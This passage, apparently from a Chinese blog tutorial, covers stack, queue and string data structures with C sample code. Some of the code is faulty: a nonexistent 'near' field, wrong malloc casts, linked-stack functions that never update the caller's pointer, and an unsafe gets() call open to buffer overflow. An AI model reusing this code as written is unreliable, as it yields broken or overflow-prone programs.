class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Push</span><span class="params">(SqStack* S, DataType e)</span> <span class="comment">//进栈操作 插入元素e为新的栈顶元素</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (StackFull(S)) <span class="comment">//栈满</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">S-&gt;top++; <span class="comment">//栈顶指针增加1</span></span><br><span class="line">S-&gt;data[S-&gt;top] = e; <span class="comment">//新插入元素赋值给栈顶空间</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="出栈"><a href="#出栈" class="headerlink" title="出栈"></a>出栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Pop</span><span class="params">(SqStack* S, DataType* e)</span> <span class="comment">//出栈操作 若栈不为空，则删除栈顶元素，用e返回其值</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (StackEmpty(S)) <span class="comment">//栈空</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">*e = S-&gt;data[S-&gt;top]; <span class="comment">//将要删除的元素赋值给e</span></span><br><span class="line">S-&gt;top--; <span class="comment">//栈顶指针减少1</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="栈的链式存储结构"><a href="#栈的链式存储结构" class="headerlink" title="栈的链式存储结构"></a>栈的链式存储结构</h2><h3 id="结构代码-1"><a href="#结构代码-1" class="headerlink" title="结构代码"></a>结构代码</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DataType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span>* <span class="title">next</span>;</span></span><br><span class="line">}LinkStack;</span><br></pre></td></tr></tbody></table></figure><h3 id="初始化栈-1"><a href="#初始化栈-1" class="headerlink" title="初始化栈"></a>初始化栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LinkStack* <span class="title">InitStack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkStack* S;</span><br><span class="line">S = <span class="literal">NULL</span>; <span class="comment">//初始化栈为空</span></span><br><span class="line"><span class="keyword">return</span> S;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="判断栈是否为空-1"><a href="#判断栈是否为空-1" class="headerlink" title="判断栈是否为空"></a>判断栈是否为空</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EmptyStack</span><span class="params">(LinkStack* S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (S == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="进栈-1"><a href="#进栈-1" class="headerlink" title="进栈"></a>进栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Push</span><span class="params">(LinkStack* S, DataType e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkStack* p = (LinkStack)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkStack));</span><br><span class="line">p-&gt;data = e; <span class="comment">//e放入新节点的数据域</span></span><br><span class="line">p-&gt;next = S; <span class="comment">//新节点插入链表表头之前</span></span><br><span class="line">S = p; <span class="comment">//新节点作为栈顶</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="出栈-1"><a href="#出栈-1" class="headerlink" title="出栈"></a>出栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Pop</span><span class="params">(LinkStack* S, DataType* e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkStack* p;</span><br><span class="line"><span class="keyword">if</span> (EmptyStack(S))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">*e = S-&gt;data; <span class="comment">//栈顶元素赋值给e</span></span><br><span class="line">p = S; <span class="comment">//p节点指向原栈顶S</span></span><br><span class="line">S = S-&gt;next; <span class="comment">//原栈顶S指向其下一个节点</span></span><br><span class="line"><span class="built_in">free</span>(p); <span class="comment">//释放原栈顶空间</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="取栈顶元素"><a href="#取栈顶元素" class="headerlink" title="取栈顶元素"></a>取栈顶元素</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetTop</span><span class="params">(LinkStack* S, DataType* e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (EmptyStack(S)) <span class="comment">//栈为空</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">*e = S-&gt;data; <span class="comment">//栈顶元素赋给变量e</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="遍历栈"><a href="#遍历栈" class="headerlink" title="遍历栈"></a>遍历栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowStack</span><span class="params">(LinkStack* S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkStack* p = S;</span><br><span class="line"><span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"栈为空\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, p-&gt;data);</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>栈相对来说就是比较特殊的线性表罢了，接下来要学习的队列，也是一种特殊的线性表；让我们拭目以待 // Bye~ </p><h1 id="队列—Queue"><a href="#队列—Queue" class="headerlink" title="队列—Queue"></a>队列—Queue</h1><h2 id="定义-6"><a href="#定义-6" class="headerlink" title="定义"></a>定义</h2><p><u><strong><em>队列是只允许在一端进行插入操作，在另一端进行删除操作的线性表；</em></strong></u></p><p>队列是一种先进先出的线性表，简称FIFO；允许插入的一端称为队尾，允许删除的一端称为队头；</p><h2 id="队列的抽象数据类型——基本操作"><a href="#队列的抽象数据类型——基本操作" class="headerlink" title="队列的抽象数据类型——基本操作"></a>队列的抽象数据类型——基本操作</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、InitQueue(*Q) <span class="comment">//初始化操作，建立一个空队列</span></span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>、DestroyQueue(*Q) <span class="comment">//若队列Q存在，则销毁</span></span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>、ClearQueue(*Q) <span class="comment">//将队列Q清空</span></span><br><span class="line">    </span><br><span class="line"><span class="number">4</span>、QueueEmpty(Q) <span class="comment">//若队列为空，返回true，否则返回false</span></span><br><span class="line">    </span><br><span class="line"><span class="number">5</span>、GetHead(Q,*e) <span class="comment">//若队列存在且非空，用e返回Q的队头元素</span></span><br><span class="line">    </span><br><span class="line"><span class="number">6</span>、EnQueu(*Q,e) <span class="comment">//若队列存在，则插入e于Q，并成为队尾元素</span></span><br><span class="line">    </span><br><span class="line"><span class="number">7</span>、DeQueue(*Q,*e) <span class="comment">// 删除队列Q中队头元素，并用e返回其值</span></span><br><span class="line">    </span><br><span class="line"><span class="number">8</span>、QueueLength(Q) <span class="comment">//返回队列Q中元素个数</span></span><br></pre></td></tr></tbody></table></figure><h2 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h2><h3 id="队列顺序存储的不足"><a href="#队列顺序存储的不足" class="headerlink" title="队列顺序存储的不足"></a>队列顺序存储的不足</h3><p>与栈不同的是，队列的出列是在队头，那就意味着，队列的所有元素都得移动，以保证下标为0的位置不为空，此</p><p>时间复杂度为O(n);</p><p>为了避免当只有一个元素时，队头和队尾重合使处理变得麻烦，所以引入两个指针，front指针指向队头元素，</p><p>rear指针指向队尾元素的下一个位置，这样当front等于rear时，此队列不是还剩一个元素，而是空队列；</p><p>假溢出：说白了就是数组末尾元素已满，再向后加就越界，而队列前面还有空位的现象（0,1,2….空着）；</p><h3 id="循环队列定义"><a href="#循环队列定义" class="headerlink" title="循环队列定义"></a>循环队列定义</h3><p>头尾相接顺序存储结构称为循环队列；</p><p>设队列最大长度为QueueSize，那么：</p><p>队列满的条件为(rear+1) % QueueSize == front ;</p><p>队空条件为front == rear ;</p><p>队列长度计算公式为(rear-front+QueueSize) % QueueSize ; (自己推导式子很简单)</p><h3 id="循环队列顺序存储结构"><a href="#循环队列顺序存储结构" class="headerlink" title="循环队列顺序存储结构"></a>循环队列顺序存储结构</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> DataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DataType data[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> front; <span class="comment">//头指针</span></span><br><span class="line"><span class="keyword">int</span> rear; <span class="comment">//尾指针，若队列不变，指向队列尾元素的下一个位置</span></span><br><span class="line">}SqQueue;</span><br></pre></td></tr></tbody></table></figure><h3 id="队列初始化"><a href="#队列初始化" class="headerlink" title="队列初始化"></a>队列初始化</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InitQueue</span><span class="params">(SqQueue *Q)</span> <span class="comment">//初始化一个对列</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">Q-&gt;front = <span class="number">0</span>;</span><br><span class="line">Q-&gt;rear = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="队列长度"><a href="#队列长度" class="headerlink" title="队列长度"></a>队列长度</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueLength</span><span class="params">(SqQueue Q)</span> <span class="comment">//求队列长度</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> (Q.rear - Q.front + MAXSIZE) % MAXSIZE;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EnQueue</span><span class="params">(SqQueue* Q, DataType e)</span> <span class="comment">//若队列未满则e入列</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> ((Q-&gt;rear + <span class="number">1</span>) % MAXSIZE == Q-&gt;front) <span class="comment">//队列已满</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">Q-&gt;data[Q-&gt;rear] = e; <span class="comment">//e赋值给队尾</span></span><br><span class="line">Q-&gt;rear = (Q-&gt;rear + <span class="number">1</span>) % MAXSIZE; <span class="comment">//rear指针后移一个位置，若到最后则转到数组头部</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="出队"><a href="#出队" class="headerlink" title="出队"></a>出队</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DeQueue</span><span class="params">(SqQueue* Q, DataType* e)</span> <span class="comment">//若队列不空则删除队头，并用e返回其值</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == Q-&gt;near) <span class="comment">//队列为空</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">*e = Q-&gt;data[Q-&gt;front]; <span class="comment">//将队头元素赋值给e</span></span><br><span class="line">Q-&gt;front = (Q-&gt;front + <span class="number">1</span>) % MAXSIZE; <span class="comment">//front指针向后移一位置，若到最后则转到数组头部</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="队列的链式存储结构及实现"><a href="#队列的链式存储结构及实现" class="headerlink" title="队列的链式存储结构及实现"></a>队列的链式存储结构及实现</h2><p>队列的链式存储结构，其实就是线性表的单链表，只不过它只能尾进头出而已，我们把它简称为链队列；</p><h3 id="链式队列存储结构"><a href="#链式队列存储结构" class="headerlink" title="链式队列存储结构"></a>链式队列存储结构</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> DataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">qnode</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DataType data; <span class="comment">//节点的数据域</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">qnode</span>* <span class="title">next</span>;</span> <span class="comment">//节点的指针域</span></span><br><span class="line">}LinkListQ;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">LinkListQ* front, * rear; <span class="comment">//队列的队头和队尾指针</span></span><br><span class="line">}LinkQueue;</span><br></pre></td></tr></tbody></table></figure><h3 id="队列初始化-1"><a href="#队列初始化-1" class="headerlink" title="队列初始化"></a>队列初始化</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LinkQueue* <span class="title">InitQueue</span><span class="params">()</span> <span class="comment">//队列初始化</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkQueue* Q;</span><br><span class="line">LinkListQ* p;</span><br><span class="line">Q = (LinkQueue*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkQueue)); <span class="comment">//头指针所指节点</span></span><br><span class="line">p = (LinkListQ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkListQ)); <span class="comment">//头节点</span></span><br><span class="line">Q-&gt;front = p; <span class="comment">//Q指针所指的front指针指向p</span></span><br><span class="line">Q-&gt;rear = p; <span class="comment">//Q指针所指的rear指针指向p</span></span><br><span class="line"><span class="keyword">return</span> Q;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="入队-1"><a href="#入队-1" class="headerlink" title="入队"></a>入队</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EnQueue</span><span class="params">(LinkQueue* Q, DataType e)</span> <span class="comment">//插入e于队尾</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkListQ* s;</span><br><span class="line">s = (LinkListQ)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkListQ)); <span class="comment">//分配内存空间</span></span><br><span class="line">s-&gt;data = e; <span class="comment">//将e存入新节点的数据域</span></span><br><span class="line">s-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">Q-&gt;rear-&gt;next = s; <span class="comment">//将新节点插入链队之后</span></span><br><span class="line">Q-&gt;rear = s; <span class="comment">//队尾指针指向队尾元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="出队-1"><a href="#出队-1" class="headerlink" title="出队"></a>出队</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DeQueue</span><span class="params">(LinkQueue* Q, DataType* e)</span> <span class="comment">//删除队头，用e返回其值</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkListQ* p;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear) <span class="comment">//队空</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">p = Q-&gt;front-&gt;next; <span class="comment">//p指向队头元素</span></span><br><span class="line">*e = p-&gt;data; <span class="comment">//队头元素的值赋给e</span></span><br><span class="line">Q-&gt;front-&gt;next = p-&gt;next; <span class="comment">//原队头节点后继p-&gt;next赋给头节点后继</span></span><br><span class="line"><span class="keyword">if</span> (Q-&gt;rear == p)<span class="comment">/*p-&gt;next==NULL*/</span> <span class="comment">//队头等于队尾，删除后将rear指向头节点</span></span><br><span class="line">{</span><br><span class="line">Q-&gt;rear = Q-&gt;front; <span class="comment">//此时队空</span></span><br><span class="line">}</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h2><p>对于循环队列和链队列的比较，可以从两方面，从时间上看，它们基本操作都是常数时间，都为O(1)，从空间看，</p><p>循环队列必须有一个固定的长度，就有了存储元素个数和空间资源浪费的问题，而链队列不存在这个问题；尽管需</p><p>要一个指针域，需要空间，但是可以接受，所以空间上链队列更加灵活；</p><p>总的来说，在可以确定队列长度最大值的情况下，建议使用循环队列，无法估计队列长度时则用链队列；</p><p>下面要学习线性结构的最后一种 — 串； Waiting for me！Bye~</p><h1 id="串—String"><a href="#串—String" class="headerlink" title="串—String"></a>串—String</h1><p>字符串，大家都不陌生对吧，学习C语言的时候就讲过了，编程题中常常遇到，这里所学习的串和字符串的用法基本一致，无非就是改改名称，优化算法，hhhh；</p><h2 id="定义-7"><a href="#定义-7" class="headerlink" title="定义"></a>定义</h2><p>串是由零个或多个字符组成的有限序列，又名叫字符串；</p><p>串中的字符数目n称为串的长度；</p><p>零个字符的串称为空串，可以用两双引号””表示，也可以用希腊字母Ø表示；</p><h2 id="串的抽象数据类型"><a href="#串的抽象数据类型" class="headerlink" title="串的抽象数据类型"></a>串的抽象数据类型</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、StrAssign(S, *chars) <span class="comment">//生成一个值等于chars的串S</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、StrCopy(S,T) <span class="comment">//串T复制得串S</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、StrLength(S) <span class="comment">//串S的长度，即S中的元素个数</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、StrCat(S,T) <span class="comment">//串T连接在串S后面</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、SubString(Sub,S,pos,len) <span class="comment">//用Sub返回串S的第pos个字符起长度为len的子串</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、StrIndex(S,T) <span class="comment">//若串S中存在与串T相同的子串，则返回它在串S中第一次出现的位置，否则返回代表错误的值</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、StrInsert(S,pos,T) <span class="comment">//在串S的第pos个字符插入串T</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、StrDelete(S,pos,len) <span class="comment">//从串S中删除第pos个字符起长度为len的子串</span></span><br><span class="line"></span><br><span class="line"><span class="number">9</span>、StrReplace(S,T,V) <span class="comment">//用串V替换串S中出现得到所有与T相等的不重叠子串</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>、StrEmpty(S) <span class="comment">//若串S为空串，则返回1，否则返回0</span></span><br><span class="line"></span><br><span class="line"><span class="number">11</span>、StrCompare(S,T) <span class="comment">//若S&gt;T，则返回值&gt;0,若S=T，则返回值=0,若S&lt;T，则返回值&lt;0</span></span><br><span class="line"></span><br><span class="line"><span class="number">12</span>、StrClear(S) <span class="comment">//将串S清空</span></span><br><span class="line"></span><br><span class="line"><span class="number">13</span>、DispStr(S) <span class="comment">//显示串S的所有字符</span></span><br></pre></td></tr></tbody></table></figure><h2 id="串的存储结构"><a href="#串的存储结构" class="headerlink" title="串的存储结构"></a>串的存储结构</h2><p>串的存储结构也是分为顺序存储结构和链式存储结构，重点讲顺序存储结构，即定长顺序串；</p><h3 id="结构代码-2"><a href="#结构代码-2" class="headerlink" title="结构代码"></a>结构代码</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line"><span class="keyword">char</span> ch[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> Len;</span><br><span class="line">}<span class="keyword">String</span>;</span><br></pre></td></tr></tbody></table></figure><h3 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrLength</span><span class="params">(<span class="keyword">String</span>* S)</span> <span class="comment">//求字符串S长度</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (S-&gt;ch[i] != <span class="string">'\0'</span>)</span><br><span class="line">{</span><br><span class="line">i++;</span><br><span class="line">}</span><br><span class="line">S-&gt;Len = i;</span><br><span class="line"><span class="keyword">return</span> (S-&gt;Len);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="建立新串"><a href="#建立新串" class="headerlink" title="建立新串"></a>建立新串</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateStr</span><span class="params">(<span class="keyword">String</span>* S)</span> <span class="comment">//建立一个新串</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">gets(S-&gt;ch);</span><br><span class="line">S-&gt;Len = StrLength(S);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="求子串函数"><a href="#求子串函数" class="headerlink" title="求子串函数"></a>求子串函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 